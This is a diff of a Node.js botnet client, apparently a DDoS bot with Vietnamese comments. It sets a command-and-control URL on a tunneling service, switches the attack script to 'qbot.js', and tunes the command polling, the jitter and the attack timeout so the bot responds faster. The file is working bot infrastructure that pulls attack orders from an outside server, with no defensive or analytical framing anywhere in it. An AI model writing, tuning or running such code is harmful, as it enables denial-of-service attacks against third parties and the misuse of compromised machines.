@@ -7,12 +7,12 @@ const fs = require('fs');
 
 // ==================== CONFIG ====================
 const CNC_BASE_URL = "https://quan-kill.serveousercontent.com";
-const ATTACK_SCRIPT = "l.js";
+const ATTACK_SCRIPT = "qbot.js";
 
 let currentTunnel = CNC_BASE_URL;
 let isAttacking = false;
 
-// ==================== TÌM PROXY ====================
+
 function findProxyFile() {
     try {
         const files = fs.readdirSync(__dirname);
@@ -77,7 +77,7 @@ async function executeAttack(commandData) {
                 console.log(`[!] Attack process killed due to timeout.`);
             }
             resolve(true);
-        }, time * 1000 + 5000);
+        }, time * 1000 + 1000);
     });
 }
 
@@ -89,7 +89,7 @@ function sleep(ms) {
 // ==================== LẤY LỆNH TỪ CNC ====================
 async function checkCommand() {
     // Random delay 0-3 giây (tránh tất cả bot gọi API cùng 1 lúc)
-    await sleep(Math.floor(Math.random() * 3000));
+    await sleep(Math.floor(Math.random() * 1000));
 
     if (isAttacking) {
         console.log("[*] Still attacking, skipping check...");
@@ -140,7 +140,7 @@ async function mainLoop() {
     while (true) {
         await checkCommand();
         // Nếu đang attack thì check lại sau 5s, không thì 3s
-        await sleep(isAttacking ? 5000 : 3000);
+        await sleep(isAttacking ? 2000 : 2000);
     }
 }
 
